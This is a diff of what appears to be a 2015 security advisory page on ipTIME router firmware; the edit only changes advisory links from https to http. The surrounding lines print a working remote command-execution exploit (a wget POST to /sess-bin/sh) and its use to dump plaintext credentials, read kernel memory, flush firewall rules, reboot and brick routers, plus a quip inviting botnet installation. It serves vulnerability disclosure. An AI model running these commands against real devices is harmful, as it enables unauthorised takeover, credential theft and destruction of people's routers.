@@ -91,10 +91,10 @@ wget -qO- --post-data="echo 'Content-type: text/plain
 '; PATH=$PATH:/sbin:/bin $2 $3 $4" http://$1/sess-bin/sh
 $
 </code></pre>
-<p><a href="https://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers!</a></p>
+<p><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers!</a></p>
 <p>Now we test the exploits in my lab!</p>
 <p><strong>How to retrieve the credentials ? (see login and password at the end of the text file)</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-dump.configuration.including.credentials.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-dump.configuration.including.credentials.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-dump.configuration.including.credentials.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-dump.configuration.including.credentials.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-dump.configuration.png" /></p>
 <p>Using CLI:</p>
 <pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /tmp/etc/iconfig.cfg
@@ -128,10 +128,10 @@ kali#
 </code></pre>
 <p>Login and password are stored in plaintext, which is a very bad security practice.</p>
 <p><strong>Listing of the filesystem</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-listing.of.the.root.filesystem.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-listing.of.the.root.filesystem.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-listing.of.the.root.filesystem.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-ls-latrR-root.png" /></p>
 <p><strong>Current running process:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-current.process.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-current.process.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-current.process.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-current.process.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-ps.png" /></p>
 <p>Using CLI:</p>
 <pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 ps -auxww
@@ -154,7 +154,7 @@ kali#
 kali#
 </code></pre>
 <p><strong>Getting the kernel memory:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-getting.kernel.memory.html">An online POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-getting.kernel.memory.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-getting.kernel.memory.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-getting.kernel.memory.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-dump.mem.png" /></p>
 <p>Using CLI:</p>
 <pre><code>./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/kcore
@@ -194,7 +194,7 @@ Cookie: efm_session_id=iNYV3r097DPbMDWu
 Cookie: efm_session_id=iNYV3r097DPbMDWu
 </code></pre>
 <p><strong>Default firewall rules:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-default.firewall.rules.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-default.firewall.rules.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-default.firewall.rules.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-default.firewall.rules.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-iptables.png" /></p>
 <p>Using CLI:</p>
 <pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 iptables -nL
@@ -254,10 +254,10 @@ Chain upnp (0 references)
 target     prot opt source               destination
 </code></pre>
 <p><strong>Opening the management interface on the WAN:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-opening.the.firewall.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-opening.the.firewall.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-opening.the.firewall.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-opening.the.firewall.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-flushing.iptables.png" /></p>
 <p><strong>Architecture:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52.grabbing.cpu.info.html">An online JavaScript POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52.grabbing.cpu.info.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52.grabbing.cpu.info.html">An online JavaScript POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52.grabbing.cpu.info.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-proc-cpuinfo.png" /></p>
 <p>Using CLI:</p>
 <pre><code>kali# ./iptime.carnage.l2.v9.52 192.168.0.1 cat /proc/cpuinfo
@@ -277,10 +277,10 @@ ll emulations           : 0
 sc emulations           : 0
 </code></pre>
 <p><strong>Reboot the device:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-reboot.html">An JavaScript online POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-reboot.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-reboot.html">An JavaScript online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-reboot.html">(exploit for version 9.52)</a></p>
 <p><img alt="" src="images/2015-iptime-0x00-reboot.png" /></p>
 <p><strong>Brick the device:</strong></p>
-<p><a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-bricking.the.device.html">An online POC is available here.</a> - <a href="https://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-bricking.the.device.html">(exploit for version 9.52)</a></p>
+<p><a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.pre.9.52-bricking.the.device.html">An online POC is available here.</a> - <a href="http://pierrekim.github.io/advisories/2015-iptime-0x00-PoC-firmware.9.52-bricking.the.device.html">(exploit for version 9.52)</a></p>
 <p><strong>By the way, d.cgi in /bin/ is an intentional backdoor from ipTIME.</strong></p>
 <p>Uploading and executing a botnet client is left as an exercise to the reader.</p>
 <p>More fun from iptime products is coming ~~~</p>
